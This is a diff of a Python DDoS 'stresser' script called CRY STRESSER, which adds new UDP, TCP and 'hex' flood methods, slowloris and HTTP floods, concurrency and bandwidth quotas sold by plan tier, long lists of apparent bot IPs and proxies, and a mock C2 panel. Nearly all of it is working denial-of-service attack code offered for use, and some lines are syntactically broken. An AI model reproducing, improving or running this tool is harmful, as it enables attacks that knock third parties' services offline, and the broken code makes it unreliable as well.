@@ -37,6 +37,7 @@ import time
 import random
 import os
 import subprocess
+import binascii
 
 
 a05aab43186b1348102ba95902 = {
@@ -58,26 +59,43 @@ a05aab43186b1348102ba95902 = {
     "79af0c177db2ee64b7301af6e1d53634": "pro",
     "ham":   "pro",
     "xxx":   "pro",
-    "lol":   "vip",
+    "lol":   "vip",   
  }
 
 PLANS = {
-    "free":  {"methods": ["tcp","syn","slowloris"], "maxtime": 120, "maxattacks": 5},
-    "hard":  {"methods": ["tcp","syn","slowloris","curl","nethold"], "maxtime": 300, "maxattacks": 10},
-    "pro":   {"methods": ["tcp","syn","curl","slowloris","nethold","fivem","minecraft"], "maxtime": 1000, "maxattacks": 50},
-    "vip":   {"methods": ["tcp","syn","tcpbypass","udpbypass","curl","slowloris","nethold","home","sslslam","fivem","minecraft"], "maxtime": 3600, "maxattacks": 100},
-    "admin": {"methods": ["*"], "maxtime": 9999, "maxattacks": None}
+    "free":  {"methods": ["tcp","syn","curl","tcphex"], "maxtime": 120, "maxattacks": 5, "maxconcurrents": 1, "total_bandwidth_mb": 100},
+    "hard":  {"methods": ["tcp","tcphex","slowloris","curl","syn"], "maxtime": 300, "maxattacks": 10, "maxconcurrents": 5, "total_bandwidth_mb": 500},
+    "pro":   {"methods": ["tcp","udp","http","curl","slowloris","nethold","minecraft","hexgen","tcphex"], "maxtime": 100, "maxattacks": 50, "maxconcurrents": 50, "total_bandwidth_mb": 1000,
+    "vip":   {"methods": ["tcp",,"tcpbypass","udpbypass","curl","slowloris","nethold","home","fivem","minecraft","hexgen","tcphex","tlsvip"], "maxtime": 3600, "maxattacks": 100, "maxconcurrents": 299, "total_bandwidth_mb": 5000},
+    "admin": {"methods": ["*"], "maxtime": 9999, "maxattacks": None, "maxconcurrents": 299, "total_bandwidth_mb": None}
 }
 
-ALL_METHODS = ["tcp","udp","http","curl","syn","slowloris","nethold","home","sslslam","tlsvip","fivem","minecraft"]
-
+ALL_METHODS = ["tcp","udp","http","curl","syn","slowloris","nethold","home","sslslam","tlsvip","fivem","minecraft","hexgen","udphex","tcphex"]
 
 bot_ipv4_list = [
     "24.5.119.233", "99.232.138.45", "184.66.78.145", "68.149.122.180", "70.55.54.221",
-    "50.67.91.48", "142.126.145.11", "24.212.171.14", "198.84.221.56", "96.44.189.3"
+    "50.67.91.48", "142.126.145.11", "24.212.171.14", "198.84.221.56", "96.44.189.3",
+    "24.141.146.211", "99.233.67.107", "184.69.15.86", "74.210.76.22", "47.216.119.39",
+    "38.86.150.50", "71.93.145.220", "174.112.133.29", "142.161.8.124", "24.53.92.47",
+    "70.49.156.165", "142.166.103.244", "76.64.34.199", "135.23.120.86", "72.139.2.178",
+    "68.144.102.13", "184.66.236.108", "199.175.56.10", "70.30.156.92", "38.104.136.66",
+    "71.197.9.122", "104.57.10.105", "24.201.245.91", "47.55.69.131", "64.229.126.62",
+    "174.5.146.113", "50.71.33.29", "47.23.182.18", "24.89.105.37", "216.121.69.75",
+    "216.165.11.64", "64.183.75.215", "142.222.197.92", "47.147.124.34", "70.26.77.231",
+    "142.165.215.120", "65.95.75.123", "72.38.140.28", "198.84.238.130", "38.122.68.201",
+    "47.53.106.88", "142.117.190.206", "174.114.88.129", "24.156.159.217", "142.118.25.42",
+    "24.138.199.68", "65.94.137.210", "50.68.181.67", "68.151.125.41", "47.52.78.14",
+    "50.67.250.90", "99.234.145.33", "174.112.105.13", "24.84.170.21", "47.54.31.114",
+    "64.228.36.77", "184.144.27.8", "47.55.116.199", "24.85.117.162", "216.209.122.187",
+    "38.88.70.90", "47.148.221.50", "174.7.193.189", "104.223.94.130", "24.66.34.19",
+    "142.134.126.85", "74.13.71.220", "198.91.69.33", "47.135.200.191", "64.180.138.116",
+    "64.229.64.150", "47.52.64.216", "174.116.40.215", "216.108.234.149", "24.53.62.100",
+    "50.70.23.207", "50.71.208.91", "142.165.19.192", "64.229.159.101", "47.23.20.180",
+    "174.112.230.101", "104.246.176.42", "65.95.126.38", "184.70.226.161", "38.92.11.29",
+    "185.57.56.122", "84.241.216.213", "82.217.111.12", "145.53.81.96", "37.97.190.154"
 ]
 
-proxy_list = [
+proxy_list = [ 
     "104.243.32.29:1080", "98.162.25.16:4145", "184.178.172.14:4145",
     "67.201.33.10:25283", "72.195.34.35:4145", "174.77.111.197:4145"  "184.181.217.213:4145",
     "184.178.172.25:15291",
@@ -214,13 +232,12 @@ proxy_list = [
     "45.79.123.67:3128",
     "142.93.45.234:10801",
     "222.59.173.105:44124"
-     ]
+]
 
-
-B = '\033[1;34m'   
-C = '\033[1;36m'   
-R = '\033[1;31m'   
-G = '\033[1;32m'   
+B = '\033[1;34m'
+C = '\033[1;36m'
+R = '\033[1;31m'
+G = '\033[1;32m'
 W = '\033[1;37m'
 RST = '\033[0m'
 
@@ -230,77 +247,137 @@ attack_running = False
 lock = threading.Lock()
 current_plan = "free"
 attacks_used = 0
-attack_counter = 0  
-SESSION_HITS = []  
-
+attack_counter = 0
+SESSION_HITS = []
+current_concurrents = 1
+bandwidth_used_mb = 0.0
 
 def banner():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"""{B}
+    print(f"""{B}⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢸⣿⣧⡀⠀⣠⣴⣶⣶⣶⣶⣶⣦⣤⣀⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠨⣿⣿⣷⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢘⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠸⣿⣿⣿⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀ ⢻⣿⣿⣷⣦⣀⣉⣽⣿⣿⣿⣿⣍⣁⣠⣾⣿⣿⣿⠁⠀⠀⠀⠀⣀⣀⡙⣷⣦⣄⠀⠀⠀
+⠀⠀⠀  ⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣠⣴⣾⠿⠟⣛⣭⣿⡿⠿⢿⣦⡀
+⠀  ⠀⠀⠀ ⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣅⣴⣿⡿⠟⠁⠀⠀⢸⠭⠋⠁⠀⠀⠀⠀
+⠀ ⠀⠀⠀⠀⠀ ⠀⠉⠛⠿⣿⣿⣿⣿⣿⡿⠟⠋⣹⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ██████╗██████╗ ██╗   ██╗
 ██╔════╝██╔══██╗╚██╗ ██╔╝
 ██║     ██████╔╝ ╚████╔╝ 
 ██║     ██╔══██╗  ╚██╔╝  
 ╚██████╗██║  ██║   ██║   
- ╚═════╝╚═╝  ╚═╝   ╚═╝   v15
+ ╚═════╝╚═╝  ╚═╝   ╚═╝   v1.6
         CRY STRESSER • 2025
       Made by Lemonaidd
-
-      Commands → !help
       Plan: {current_plan.upper()} | Max Time: {PLANS[current_plan]['maxtime']}s
 {RST}""")
 
 
-def attack_thread(ip, port, duration, method, request_type="POST", mode=2):
+def hex_attack_thread(ip, port, duration, method, mode=2):
     global packets_sent
     end = time.time() + duration
-    payload = random._urandom(9292)
 
     while time.time() < end and attack_running:
         try:
-            bot_ip = random.choice(bot_ipv4_list)
-            proxy = random.choice(proxy_list)
-            bot_id = random.randint(1, 10)
+            payload = binascii.unhexlify(''.join(random.choice('0123456789abcdef') for _ in range(131072)))  
+            hex_id = binascii.hexlify(random._urandom(4)).decode().upper()
 
-            if method == "udp":
+            if method == "udphex":
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.settimeout(0.1)
-                for _ in range(10):
+                for _ in range(30):
                     s.sendto(payload, (ip, port))
                     with lock:
                         packets_sent += 1
                 s.close()
                 if mode == 2:
-                    print(f"{C}[{method.upper()}] {ip}:{port} via BotID:{bot_id} | proxy:{proxy}{RST}")
+                    print(f"{C}[UDPHEX] {ip}:{port} HEXID:{hex_id}{RST}")
 
-            elif method == "nethold":
+            elif method == "tcphex":
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.1)
-                s.connect((ip, port))
-                for _ in range(8):
-                    s.send(payload[:9292])
+                s.settimeout(0.3)
+                try:
+                    s.connect((ip, port))
+                    for _ in range(20):
+                        s.send(payload)
+                        with lock:
+                            packets_sent += 1
+                    s.close()
+                except:
+                    s.close()
+                if mode == 2:
+                    print(f"{C}[TCPHEX] {ip}:{port} HEXID:{hex_id}{RST}")
+
+            elif method == "hexgen":
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if random.random() > 0.5 else socket.SOCK_DGRAM)
+                s.settimeout(0.3)
+                try:
+                    if s.type == socket.SOCK_STREAM:
+                        s.connect((ip, port))
+                        s.send(payload)
+                    else:
+                        s.sendto(payload, (ip, port))
+                    with lock:
+                        packets_sent += 1
+                    s.close()
+                except:
+                    pass
+                if mode == 2:
+                    print(f"{C}[HEXGEN] {ip}:{port} HEXID:{hex_id}{RST}")
+
+        except Exception:
+            pass
+
+
+def attack_thread(ip, port, duration, method, request_type="GET", mode=2):
+    global packets_sent
+    end = time.time() + duration
+
+    while time.time() < end and attack_running:
+        try:
+            proxy = random.choice(proxy_list)
+            bot_id = random.randint(1, 100)
+
+            if method == "udp":
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                payload = random._urandom(65535)
+                for _ in range(40):
+                    s.sendto(payload, (ip, port))
                     with lock:
                         packets_sent += 1
                 s.close()
                 if mode == 2:
-                    print(f"{C}[{method.upper()}] {ip}:{port} via BotID:{bot_id} | proxy:{proxy}{RST}")
+                    print(f"{C}[UDP] {ip}:{port} via {bot_id} | proxy:{proxy}{RST}")
 
-            elif method == "syn":
-                with lock:
-                    packets_sent += 1
+            elif method == "tcp":
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.3)
+                try:
+                    s.connect((ip, port))
+                    payload = random._urandom(65535)
+                    for _ in range(30):
+                        s.send(payload)
+                        with lock:
+                            packets_sent += 1
+                    s.close()
+                except:
+                    s.close()
                 if mode == 2:
-                    print(f"{C}[{method.upper()}] {ip}:{port} via BotID:{bot_id}{RST}")
+                    print(f"{C}[TCP] {ip}:{port} via {bot_id} | proxy:{proxy}{RST}")
 
             elif method == "curl":
-                subprocess.Popen(f"curl -X {request_type} http://{ip}:{port}", shell=True,
+                subprocess.Popen(f"curl -s -m 3 http://{ip}:{port}", shell=True,
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 with lock:
                     packets_sent += 1
                 if mode == 2:
-                    print(f"{C}[{method.upper()}] {ip}:{port} via BotID:{bot_id} | proxy:{proxy}{RST}")
+                    print(f"{C}[CURL] {ip}:{port} via {bot_id} | proxy:{proxy}{RST}")
 
         except Exception:
-            pass  
+            pass
 
 
 def l7_curl(url, duration):
@@ -311,7 +388,7 @@ def l7_curl(url, duration):
             subprocess.Popen(["curl", "-s", "-m", "3", url], stdout=subprocess.DEVNULL)
             with lock:
                 packets_sent += 1
-        except Exception:
+        except:
             pass
 
 def slowloris(target, port, duration):
@@ -319,20 +396,18 @@ def slowloris(target, port, duration):
     end = time.time() + duration
     while time.time() < end and attack_running:
         try:
-            for _ in range(50):
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(2)
-                s.connect((target, port))
-                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
-                sockets.append(s)
-            time.sleep(5)
-        except Exception:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(4)
+            s.connect((target, port))
+            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
+            sockets.append(s)
+        except:
             pass
     for s in sockets:
         try: s.close()
         except: pass
 
-def tcp(target, port, duration):
+def nethold(target, port, duration):
     end = time.time() + duration
     while time.time() < end and attack_running:
         try:
@@ -340,28 +415,36 @@ def tcp(target, port, duration):
             s.connect((target, port))
             s.send(b"GET / HTTP/1.1\r\n")
             time.sleep(10)
-        except Exception:
+        except:
             pass
 
 
-def launch(ip, port, duration, method, mode=2):
-    global attack_running, packets_sent, attacks_used, attack_counter, SESSION_HITS
+def launch(ip, port, duration, method, mode=2, concurrents=None):
+    global attack_running, packets_sent, attacks_used, bandwidth_used_mb
 
     max_attacks = PLANS[current_plan]["maxattacks"]
     if max_attacks is not None and attacks_used >= max_attacks:
         print(f"{R}Sorry cannot perform anymore attacks. Try again later or Upgrade your plan{RST}")
         return
 
+    used_concurrents = concurrents if concurrents is not None else current_concurrents
+    used_concurrents = min(used_concurrents, PLANS[current_plan]["maxconcurrents"])
+
+    est_mb = used_concurrents * 0.5 * duration 
+    total_allowed = PLANS[current_plan]["total_bandwidth_mb"]
+    if total_allowed is not None and (bandwidth_used_mb + est_mb) > total_allowed:
+        print(f"{R}[C2] Bandwidth limit exceeded! Try again later or Upgrade your plan")
+        return
+
+    bandwidth_used_mb += est_mb
+
     attacks_used += 1
+    global attack_counter
     attack_counter += 1
     attack_id = f"{attack_counter:04d}"
     current_time = time.strftime("%H:%M:%S")
 
-    
-    if ':' in ip:
-        masked_target = f"{ip.split(':')[0].split('.')[0]}.{ip.split(':')[0].split('.')[1]}.*.{port}"
-    else:
-        masked_target = f"{ip.split('.')[0]}.{ip.split('.')[1]}.*.{port}"
+    masked_target = f"{ip.split('.')[0]}.{ip.split('.')[1]}.*.{port}"
 
     hit_entry = {
         "id": attack_id,
@@ -369,6 +452,7 @@ def launch(ip, port, duration, method, mode=2):
         "time": current_time,
         "duration": duration,
         "target": masked_target,
+        "concurrents": used_concurrents,
         "status": "RUNNING"
     }
     SESSION_HITS.append(hit_entry)
@@ -380,21 +464,27 @@ def launch(ip, port, duration, method, mode=2):
     print(f"{B}║ Target       : {C}{ip:<35} {B}║{RST}")
     print(f"{B}║ Port         : {C}{port:<35} {B}║{RST}")
     print(f"{B}║ Method       : {C}{method.upper():<35} {B}║{RST}")
+    print(f"{B}║ Concurrents  : {C}{used_concurrents:<35} {B}║{RST}")
     print(f"{B}║ Time Started : {C}{current_time:<35} {B}║{RST}")
     print(f"{B}║ Duration     : {C}{duration}s{' '*30} {B}║{RST}")
-    print(f"{B}║ Attack ID    : {C}{attack_id:<35} {B} ║{RST}")
-    print(f"{B}╚════════════════════════════════════════════════════╝{RST}\n")
+    print(f"{B}║ Attack ID    : {C}{attack_id:<35} {B}║{RST}")
+    print(f"{B}╚══════════════════════════════════════════════════╝{RST}\n")
 
     if method in ["http","https"]:
-        threading.Thread(target=l7_curl, args=(f"http://{ip}:{port}", duration), daemon=True).start()
+        for _ in range(used_concurrents):
+            threading.Thread(target=l7_curl, args=(f"http://{ip}:{port}", duration), daemon=True).start()
     elif method == "slowloris":
-        threading.Thread(target=slowloris, args=(ip, port, duration), daemon=True).start()
-    elif method == "tcp":
-        for _ in range(40):
-            threading.Thread(target=tcp, args=(ip, port, duration), daemon=True).start()
+        for _ in range(used_concurrents):
+            threading.Thread(target=slowloris, args=(ip, port, duration), daemon=True).start()
+    elif method == "nethold":
+        for _ in range(used_concurrents):
+            threading.Thread(target=nethold, args=(ip, port, duration), daemon=True).start()
+    elif method in ["hexgen", "udphex", "tcphex"]:
+        for _ in range(used_concurrents):
+            threading.Thread(target=hex_attack_thread, args=(ip, port, duration, method, mode), daemon=True).start()
     else:
-        for _ in range(60):
-            threading.Thread(target=attack_thread, args=(ip, port, duration, method, "POST", mode), daemon=True).start()
+        for _ in range(used_concurrents):
+            threading.Thread(target=attack_thread, args=(ip, port, duration, method, "GET", mode), daemon=True).start()
 
     time.sleep(duration + 2)
     attack_running = False
@@ -406,13 +496,15 @@ while True:
     try:
         key = input(f"{B}└cry@Passkey: {RST}").strip()
         if key in a05aab43186b1348102ba95902:
-            #   :import encode.decode('7703f660372861e08911f11b9e8495b6'):    #
             current_plan = a05aab43186b1348102ba95902[key]
-            print(f"{C}[+] Logged in as {current_plan.upper()}{RST}")
-            print(f"{C}   Max Time: {PLANS[current_plan]['maxtime']}s{RST}\n")
+            bandwidth_used_mb = 0.0
+            current_concurrents = 50
+            print(f"{C}[C2] Logged in as {current_plan.upper()}{RST}")
+            print(f"{C}   Max Time: {PLANS[current_plan]['maxtime']}s{RST}")
+            print(f"{C}   Max Concurrents: {PLANS[current_plan]['maxconcurrents']}{RST}\n")
             banner()
             break
-        print(f"{R}[-] Invalid{RST}")
+        print(f"{R}[C2] Invalid{RST}")
     except KeyboardInterrupt:
         print(f"\n{B}Closed.{RST}")
         exit()
@@ -433,6 +525,7 @@ while True:
 ║ !udp IP P T → Direct attack                ║
 ║ !methods    → Show all methods             ║
 ║ !hitlist    → Session history              ║
+║ !con [num]  → Set concurrents              ║
 ║ !color      → Change color scheme          ║
 ║ !cls        → Clear screen                 ║
 ║ !exit       → Exit                         ║
@@ -442,30 +535,50 @@ while True:
 
         elif cmd == "!hitlist":
             if not SESSION_HITS:
-                print(f"{R}[-] No Attack history found. Try starting an attack{RST}")
+                print(f"{R}[C2] No Attack history found. Try starting an attack{RST}")
                 continue
 
             print(f"""
 {B}╔{'═'*70}╗
-║{' ATTACK HISTORY '.center(70)}║
+║{' ATTACK HISTORY'.center(70)}║
 ╠{'═'*70}╣
-║ {'ID':<6} {'METHOD':<10} {'TARGET':<20} {'TIME':<10} {'DURATION':<12} {'STATUS':<10} ║
+║ {'ID':<6} {'METHOD':<10} {'TARGET':<20} {'TIME':<10} {'DUR':<8} {'CONC':<8} {'STATUS':<10} ║
 ╠{'═'*70}╣{RST}""")
 
             for h in SESSION_HITS:
-                duration_txt = f"{h['duration']}s"
                 status_color = G if h['status'] == "OVER" else C
-                print(f"{C}║ {h['id']:<6} {h['method']:<10} {h['target']:<20} {h['time']:<10} {duration_txt:<12} {status_color}{h['status']:<10}{RST} {C}║{RST}")
+                print(f"{C}║ {h['id']:<6} {h['method']:<10} {h['target']:<20} {h['time']:<10} {h['duration']}s{' ':<4} {h['concurrents']:<8} {status_color}{h['status']:<10}{RST} {C}║{RST}")
 
             print(f"{B}╚{'═'*70}╝{RST}\n")
 
         elif cmd == "!methods":
+            total_bw = "Unlimited" if PLANS[current_plan]["total_bandwidth_mb"] is None else f"{PLANS[current_plan]['total_bandwidth_mb']}MB"
+            remaining = "Unlimited" if PLANS[current_plan]["total_bandwidth_mb"] is None else f"{(PLANS[current_plan]['total_bandwidth_mb'] - bandwidth_used_mb):.1f}MB"
+            print(f"\n{B}=== PLAN DETAILS ==={RST}")
+            print(f"   Plan: {current_plan.upper()}")
+            print(f"   Max Time: {PLANS[current_plan]['maxtime']}s")
+            print(f"   Max Concurrents: {PLANS[current_plan]['maxconcurrents']}")
+            print(f"   Remaining Bandwidth: {remaining}")
             print(f"\n{B}=== METHODS LIST ==={RST}")
             for m in ALL_METHODS:
                 color = G if m in PLANS[current_plan]["methods"] or PLANS[current_plan]["methods"] == ["*"] else R
-                status = "Available" if color == G else "unavailable"
+                status = "Available" if color == G else "Locked"
                 print(f"   {color}{m.upper():<12} → {status}{RST}")
-            print(f"\n{B}Plan: {current_plan.upper()} | Max Time: {PLANS[current_plan]['maxtime']}s{RST}\n")
+            print(f"\n")
+
+        elif cmd.startswith("!con"):
+            try:
+                if len(args) == 1:
+                    print(f"{C}Current concurrents: {current_concurrents} (max {PLANS[current_plan]['maxconcurrents']}){RST}")
+                else:
+                    new_con = int(args[1])
+                    if 1 <= new_con <= PLANS[current_plan]["maxconcurrents"]:
+                        current_concurrents = new_con
+                        print(f"{G}[C2] Concurrents set to {new_con}{RST}")
+                    else:
+                        print(f"{R}[C2] Must be 1-{PLANS[current_plan]['maxconcurrents']}{RST}")
+            except ValueError:
+                print(f"{R}[C2] Invalid number{RST}")
 
         elif cmd == "!color":
             print(f"""{B}
@@ -486,17 +599,17 @@ while True:
             elif choice == "4":
                 B = '\033[38;5;39m'
                 C = '\033[38;5;51m'
-            print(f"{C}[+] Color scheme changed!{RST}")
+            print(f"{C}[C2] Color scheme changed!{RST}")
             banner()
 
         elif cmd == "!c2":
             if current_plan != "admin":
-                print(f"{R}[-] Admin only{RST}")
+                print(f"{R}[C2] Admin only!{RST}")
                 continue
             print(f"""{B}
 ╔══════════════════ C2 CONTROL PANEL ════════╗
 ║ Status: *  bots online                     ║
-║ Proxies: * active                          ║
+║ Proxies: *  active                         ║
 ║ Commands:                                  ║
 ║   !send <method> <target> <port> <time>    ║
 ║   !update payload                          ║
@@ -504,8 +617,8 @@ while True:
 ║   !proxy on/off                            ║
 ╚════════════════════════════════════════════╝{RST}
 """)
-            c2_cmd = input(f"{B}C2 Command: {RST}")
-            print(f"{C}[C2] Executed: {c2_cmd}{RST}")
+            c2_cmd = input(f"{B}Command: {RST}")
+            print(f"{C}[C2]: {c2_cmd}{RST}")
 
         elif cmd == "!l4":
             try:
@@ -517,44 +630,40 @@ while True:
                 mode = input(f"{B}Mode: {RST}") or "2"
 
                 if method not in PLANS[current_plan]["methods"] and PLANS[current_plan]["methods"] != ["*"]:
-                    print(f"{R}[-] Method locked{RST}")
+                    print(f"{R}[C2] Method locked{RST}")
                     continue
                 if duration > PLANS[current_plan]["maxtime"]:
-                    print(f"{R}[-] Max time exceeded{RST}")
+                    print(f"{R}[C2] Max time exceeded{RST}")
                     continue
 
                 launch(target, port, duration, method, 1 if mode == "1" else 2)
             except ValueError:
-                print(f"{R}[-] Invalid input{RST}")
-            except Exception as e:
-                print(f"{R}[-] Error: {e}{RST}")
+                print(f"{R}[C2] Invalid input{RST}")
 
         elif cmd == "!l7":
             try:
                 url = input(f"{B}URL: {RST}")
-                duration = max(60, int(input(f"{B}Duration (min 60s): {RST}")))
+                duration = max(60, int(input(f"{B}Time (min 60s): {RST}")))
                 if duration > PLANS[current_plan]["maxtime"]:
-                    print(f"{R}[-] Max time exceeded{RST}")
+                    print(f"{R}[C2] Max time exceeded{RST}")
                     continue
                 host = url.split("//")[-1].split("/")[0]
-                port = 443 if url.startswith("https") else 443
-                method = input(f"{B}Method: {RST}").lower() or "curl"
+                port = 443 if url.startswith("https") else 80
+                method = input(f"{B}L7 Method (curl/slowloris/nethold): {RST}").lower() or "curl"
                 if method in ["slowloris","nethold"] and current_plan not in ["pro","vip","admin"]:
-                    print(f"{R}[-] slowloris/nethold = pro+ only{RST}")
+                    print(f"{R}[C2] slowloris/nethold = pro+ only{RST}")
                     continue
                 print(f"{B}1 = Silent | 2 = Flood Logs{RST}")
                 mode = input(f"{B}Mode: {RST}") or "2"
                 launch(host, port, duration, method, 1 if mode == "1" else 2)
             except ValueError:
-                print(f"{R}[-] Invalid input{RST}")
-            except Exception as e:
-                print(f"{R}[-] Error: {e}{RST}")
+                print(f"{R}[C2] Invalid input{RST}")
 
         elif cmd in ["!cls","cls"]:
             banner()
 
         elif cmd in ["!exit","exit"]:
-            print(f"{B}Thanks for using CryC2,Goodbye.{RST}")
+            print(f"{B}Goodbye.{RST}")
             break
 
         
@@ -566,20 +675,18 @@ while True:
                 duration = max(60, int(args[3]))
 
                 if method not in PLANS[current_plan]["methods"] and PLANS[current_plan]["methods"] != ["*"]:
-                    print(f"{R}[-] Sorry! Method unavailable, Try a diffrent method or Upgrade your plan.{RST}")
+                    print(f"{R}[C2] Method locked{RST}")
                     continue
                 if duration > PLANS[current_plan]["maxtime"]:
-                    print(f"{R}[-] Max time exceeded{RST}")
+                    print(f"{R}[C2] Max time exceeded{RST}")
                     continue
 
                 launch(target, port, duration, method)
             except ValueError:
-                print(f"{R}[-] Invalid input{RST}")
-            except Exception as e:
-                print(f"{R}[-] Error: {e}{RST}")
+                print(f"{R}[C2] Invalid input{RST}")
 
     except KeyboardInterrupt:
         print(f"\n{B}Closed.{RST}")
         break
     except Exception as e:
-        print(f"{R}[-] Unexpected error: {e}{RST}")
+        print(f"{R}[C2] Unexpected error: {e}{RST}")
